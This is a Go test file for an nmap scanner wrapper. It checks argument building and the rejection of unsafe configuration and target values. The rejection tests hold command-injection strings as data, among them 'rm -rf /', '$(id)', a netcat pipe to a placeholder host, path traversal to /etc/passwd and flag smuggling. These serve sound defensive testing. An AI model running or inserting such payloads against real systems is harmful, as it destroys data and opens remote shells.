package nmap

import (
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/mauropm/wadjet/internal/scanners"
	"github.com/mauropm/wadjet/internal/scanners/manifest"
)

func nmapManifest(t *testing.T) *manifest.Manifest {
	t.Helper()
	// Exercise the real bundled manifest end to end.
	mfs, err := manifest.LoadDir(filepath.Join("..", "..", "..", "configs", "scanners"))
	require.NoError(t, err)
	for _, m := range mfs {
		if m.Name == "nmap" {
			return m
		}
	}
	t.Fatal("bundled nmap manifest not found")
	return nil
}

func req(targets []string, cfg scanners.ScannerConfig) scanners.ScanRequest {
	var ts []scanners.Target
	for _, raw := range targets {
		ts = append(ts, scanners.Target{Raw: raw, Type: "ip"})
	}
	return scanners.ScanRequest{Targets: ts, Config: cfg, WorkDir: t_workDir()}
}

func t_workDir() string { return "/tmp/wadjet-test" }

func TestBuildArgsTable(t *testing.T) {
	tests := []struct {
		name     string
		config   scanners.ScannerConfig
		wantArgs []string // must all appear
		deny     []string // must NOT appear
		wantErr  string
	}{
		{
			name:     "defaults",
			config:   scanners.ScannerConfig{},
			wantArgs: []string{"-oX", "-", "--stylesheet=/dev/null", "--top-ports", "1000", "-T3", "--reason"},
			deny:     []string{"-O", "-sV", "-sC", "-sn", "-p-", "-n", "-Pn"},
		},
		{
			name:     "ping only",
			config:   scanners.ScannerConfig{"scan_intensity": "ping_only"},
			wantArgs: []string{"-sn"},
			deny:     []string{"--top-ports"},
		},
		{
			name:     "common ports",
			config:   scanners.ScannerConfig{"scan_intensity": "common"},
			wantArgs: []string{"--top-ports", "100"},
		},
		{
			name:     "full range",
			config:   scanners.ScannerConfig{"scan_intensity": "full"},
			wantArgs: []string{"-p-"},
		},
		{
			name:     "custom ports override intensity",
			config:   scanners.ScannerConfig{"ports": "22,80,443,8000-8100", "scan_intensity": "full"},
			wantArgs: []string{"-p", "22,80,443,8000-8100"},
			deny:     []string{"-p-"},
		},
		{
			name:     "service detection",
			config:   scanners.ScannerConfig{"service_detection": true},
			wantArgs: []string{"-sV"},
		},
		{
			name:     "default scripts",
			config:   scanners.ScannerConfig{"scripts": true},
			wantArgs: []string{"-sC"},
		},
		{
			name:     "script categories comma list",
			config:   scanners.ScannerConfig{"script_categories": []any{"safe", "vuln"}},
			wantArgs: []string{"--script", "safe,vuln"},
		},
		{
			name:     "custom scripts discrete",
			config:   scanners.ScannerConfig{"custom_scripts": []any{"http-title", "ssh-hostkey"}},
			wantArgs: []string{"--script=http-title", "--script=ssh-hostkey"},
		},
		{
			name:     "timing slow",
			config:   scanners.ScannerConfig{"timing": "slow"},
			wantArgs: []string{"-T2"},
			deny:     []string{"-T3"},
		},
		{
			name:     "host timeout and parallelism",
			config:   scanners.ScannerConfig{"host_timeout": "5m", "max_parallelism": 20.0},
			wantArgs: []string{"--host-timeout", "5m", "--max-parallelism", "20"},
		},
		{
			name:     "no reverse dns",
			config:   scanners.ScannerConfig{"reverse_dns": false},
			wantArgs: []string{"-n"},
		},
		{
			name:     "skip ping",
			config:   scanners.ScannerConfig{"skip_ping": true},
			wantArgs: []string{"-Pn"},
		},
		// ── rejections ────────────────────────────────────────────────
		{name: "unknown intensity", config: scanners.ScannerConfig{"scan_intensity": "insane"}, wantErr: "unknown scan_intensity"},
		{name: "ports semicolon injection", config: scanners.ScannerConfig{"ports": "80; rm -rf /"}, wantErr: "rejected by validation"},
		{name: "ports zero", config: scanners.ScannerConfig{"ports": "0"}, wantErr: "out of range"},
		{name: "ports 65536", config: scanners.ScannerConfig{"ports": "65536"}, wantErr: "out of range"},
		{name: "ports inverted range", config: scanners.ScannerConfig{"ports": "9000-8000"}, wantErr: "inverted"},
		{name: "ports flag", config: scanners.ScannerConfig{"ports": "--top-ports"}, wantErr: "rejected by validation"},
		{name: "ports glob", config: scanners.ScannerConfig{"ports": "*"}, wantErr: "rejected by validation"},
		{name: "ports backtick", config: scanners.ScannerConfig{"ports": "$(id)"}, wantErr: "rejected by validation"},
		{name: "script category injection", config: scanners.ScannerConfig{"script_categories": []any{"safe; id"}}, wantErr: "rejected by validation"},
		{name: "script category not allowed", config: scanners.ScannerConfig{"script_categories": []any{"intrusive"}}, wantErr: "not in the allowed set"},
		{name: "script category exploit", config: scanners.ScannerConfig{"script_categories": []any{"exploit"}}, wantErr: "not in the allowed set"},
		{name: "script category dos", config: scanners.ScannerConfig{"script_categories": []any{"dos"}}, wantErr: "not in the allowed set"},
		{name: "custom script unknown", config: scanners.ScannerConfig{"custom_scripts": []any{"nse-master-nvm"}}, wantErr: "not in the allowed set"},
		{name: "custom script flag", config: scanners.ScannerConfig{"custom_scripts": []any{"--script=http-title"}}, wantErr: "rejected by validation"},
		{name: "custom script path traversal", config: scanners.ScannerConfig{"custom_scripts": []any{"../../etc/passwd"}}, wantErr: "rejected by validation"},
		{name: "unknown timing", config: scanners.ScannerConfig{"timing": "insane"}, wantErr: "unknown timing template"},
		{name: "host timeout injection", config: scanners.ScannerConfig{"host_timeout": "5m; rm -rf"}, wantErr: "invalid host_timeout"},
		{name: "parallelism too big", config: scanners.ScannerConfig{"max_parallelism": 1000.0}, wantErr: "1-128"},
		{name: "parallelism fractional", config: scanners.ScannerConfig{"max_parallelism": 1.5}, wantErr: "integer"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			args, err := BuildArgs(nmapManifest(t), req([]string{"10.0.0.1"}, tc.config))
			if tc.wantErr != "" {
				require.Error(t, err)
				assert.Contains(t, err.Error(), tc.wantErr)
				return
			}
			require.NoError(t, err)
			for _, want := range tc.wantArgs {
				assert.True(t, slices.Contains(args, want), "expected %q in %v", want, args)
			}
			for _, no := range tc.deny {
				assert.False(t, slices.Contains(args, no), "unexpected %q in %v", no, args)
			}
			// targets always appended last, discrete.
			require.NotEmpty(t, args)
			assert.Equal(t, "10.0.0.1", args[len(args)-1])
		})
	}
}

func TestBuildArgsOSDetectionGracefulDegradation(t *testing.T) {
	defer func(orig func() bool) { rootCheck = orig }(rootCheck)

	rootCheck = func() bool { return true }
	args, err := BuildArgs(nmapManifest(t), req([]string{"10.0.0.1"},
		scanners.ScannerConfig{"os_detection": true}))
	require.NoError(t, err)
	assert.True(t, slices.Contains(args, "-O"))

	rootCheck = func() bool { return false }
	args, err = BuildArgs(nmapManifest(t), req([]string{"10.0.0.1"},
		scanners.ScannerConfig{"os_detection": true}))
	require.NoError(t, err, "non-root must degrade gracefully, not fail")
	assert.False(t, slices.Contains(args, "-O"))
}

func TestBuildArgsTargetInjectionRejected(t *testing.T) {
	m := nmapManifest(t)
	injections := []string{
		"127.0.0.1; rm -rf /",
		"127.0.0.1 && id",
		"$(whoami)",
		"`id`",
		"--script=http-backdoor",
		"-oG /tmp/evil",
		"127.0.0.1 | nc evil 4444",
		"127.0.0.1\n-oG /tmp/x",
		"nmap -oX .",
		"",
	}
	for _, inj := range injections {
		t.Run(inj, func(t *testing.T) {
			_, err := BuildArgs(m, req([]string{inj}, nil))
			require.Error(t, err)
		})
	}
}

func TestValidatePortRange(t *testing.T) {
	ok := []string{"22", "22,80,443", "1-1024", "8000-8100,9000", "1", "65535", "1-100,200-300"}
	for _, p := range ok {
		require.NoError(t, ValidatePortRange(p), p)
	}
	bad := []string{"", "0", "65536", "abc", "80;id", "80 81", "-80", "80-", "9000-8000",
		"1-65535,2-3", "0-1", "$(id)", "--all", "*", "80,,443"}
	for _, p := range bad {
		require.Error(t, ValidatePortRange(p), p)
	}
}

func TestValidateScriptLists(t *testing.T) {
	for _, c := range ScriptCategories {
		_, err := validateScriptList([]any{c}, ScriptCategories, "script_categories")
		require.NoError(t, err, c)
	}
	_, err := validateScriptList([]any{"safe", "safe", "vuln"}, ScriptCategories, "script_categories")
	require.NoError(t, err, "dedupe not required but must not error")

	// every known script must pass its own allowlist check
	for _, s := range KnownScripts {
		_, err := validateScriptList([]any{s}, KnownScripts, "custom_scripts")
		require.NoError(t, err, s)
	}
}

func TestNoShellMetacharactersEverReachArgs(t *testing.T) {
	// Property-ish sweep: for a matrix of adversarial config values, if
	// BuildArgs succeeds, no argv element may contain shell-active bytes.
	adversarial := []any{
		"; rm -rf /", "a|b", "a&b", "`id`", "$(id)", "a b", "a\nb", "--evil",
		[]any{"; rm", "|id"}, []any{"a\nb"}, 42, map[string]any{"x": 1},
	}
	keys := []string{"ports", "script_categories", "custom_scripts", "host_timeout", "timing", "scan_intensity"}
	for _, key := range keys {
		for _, v := range adversarial {
			cfg := scanners.ScannerConfig{key: v}
			args, err := BuildArgs(nmapManifest(t), req([]string{"10.0.0.1"}, cfg))
			if err != nil {
				continue // rejected — fine
			}
			for _, a := range args {
				assert.NotRegexp(t, "[;&|`$()\n \t*?<>\"'\\\\]", a,
					"config %s=%v leaked unsafe argv element %q", key, v, a)
			}
		}
	}
}

func TestScannerValidateConfigRejectsBadValuesEarly(t *testing.T) {
	s, err := New(nmapManifest(t))
	require.NoError(t, err)
	require.NoError(t, s.ValidateConfig(scanners.ScannerConfig{"service_detection": true}))
	require.Error(t, s.ValidateConfig(scanners.ScannerConfig{"ports": "80; rm -rf /"}))
	require.Error(t, s.ValidateConfig(scanners.ScannerConfig{"unknown_option": true}))
}

func TestScannerAccessors(t *testing.T) {
	s, err := New(nmapManifest(t))
	require.NoError(t, err)
	assert.Equal(t, "nmap", s.Name())
	assert.Equal(t, "nmap", s.Manifest().Name)
	caps := s.Capabilities()
	require.NotEmpty(t, caps)
	assert.Equal(t, scanners.CapHostDiscovery, caps[0])
	assert.False(t, strings.Contains(s.Description(), "\x00"))
}
